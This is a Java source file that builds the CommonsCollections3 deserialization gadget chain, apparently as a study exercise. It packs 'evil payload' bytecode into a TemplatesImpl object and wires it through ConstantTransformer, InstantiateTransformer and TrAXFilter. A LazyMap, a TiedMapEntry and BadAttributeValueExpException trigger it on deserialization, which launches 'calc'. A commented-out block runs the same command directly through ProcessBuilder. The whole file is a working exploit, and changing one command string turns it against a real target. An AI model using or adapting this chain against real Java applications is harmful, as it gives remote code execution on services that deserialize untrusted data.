package Seri.CCGadgets;

import Seri.Utils;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import java.io.IOException;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections3 {
    public static void main(String[] args) throws Exception {
//        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(
//                new Class[]{String[].class} ,
//                new Object[]{new String[]{"calc"}}
//        );
//        ProcessBuilder processBuilder = (ProcessBuilder) instantiateTransformer.transform(ProcessBuilder.class);
//        processBuilder.start();

        byte[] bytes = Utils.getEvilPayload("calc");
        TemplatesImpl templates = new TemplatesImpl();
        Utils.setValue(templates , "_bytecodes", new byte[][]{bytes});
        Utils.setValue(templates , "_name", "gadgets");
        Utils.setValue(templates , "_tfactory", new TransformerFactoryImpl());

        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(
                        new Class[]{Templates.class},
                        new Object[]{templates}
                )
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "foo");

        BadAttributeValueExpException bad = new BadAttributeValueExpException(null);
        Utils.setValue(bad , "val", tiedMapEntry);

        Utils.serialize(bad ,"bin/CC3.bin");
        Utils.unserialize("bin/CC3.bin");



    }
}

